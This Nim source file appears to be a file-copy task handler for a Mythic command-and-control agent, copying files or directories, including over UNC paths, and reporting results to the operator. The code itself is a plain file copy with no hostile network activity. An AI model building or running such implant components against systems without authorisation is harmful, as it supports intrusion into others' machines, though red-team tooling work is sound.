import ../config
import ../utils/mythic_responses
import std/[json, os, strformat, strutils]

type
  CpArgs = object
    source: string
    destination: string

proc cpFile*(taskId: string, params: string): JsonNode =
  let cfg = getConfig()
  
  # Parse arguments
  let args = parseJson(params).to(CpArgs)
  
  if cfg.debug:
    echo &"[DEBUG] Copying '{args.source}' to '{args.destination}'"
  
  try:
    # Check if source exists
    if not fileExists(args.source) and not dirExists(args.source):
      return mythicError(taskId, &"Source path does not exist: {args.source}")
    
    # Handle UNC paths and absolute paths for source
    let srcPath = if args.source.startsWith("\\\\") or isAbsolute(args.source):
      args.source
    else:
      getCurrentDir() / args.source
    
    let absSrcPath = if fileExists(srcPath) or dirExists(srcPath):
      normalizedPath(srcPath)
    else:
      return mythicError(taskId, &"Source path does not exist: {srcPath}")
    
    # Handle UNC paths and absolute paths for destination
    var destPath = if args.destination.startsWith("\\\\") or isAbsolute(args.destination):
      args.destination
    else:
      getCurrentDir() / args.destination
    
    # If destination is a directory, append source filename
    if dirExists(destPath):
      let (_, name, ext) = splitFile(absSrcPath)
      destPath = destPath / (name & ext)
    
    # Copy the file
    if fileExists(absSrcPath):
      os.copyFile(absSrcPath, destPath)
    elif dirExists(absSrcPath):
      copyDir(absSrcPath, destPath)
    
    let normalizedDest = normalizedPath(destPath)
    
    if cfg.debug:
      echo &"[DEBUG] Copied '{absSrcPath}' to '{normalizedDest}'"
    
    return mythicSuccess(taskId, &"Copied '{absSrcPath}' to '{normalizedDest}'")
    
  except OSError as e:
    return mythicError(taskId, &"Failed to copy: {e.msg}")
  except Exception as e:
    return mythicError(taskId, &"Error: {e.msg}")
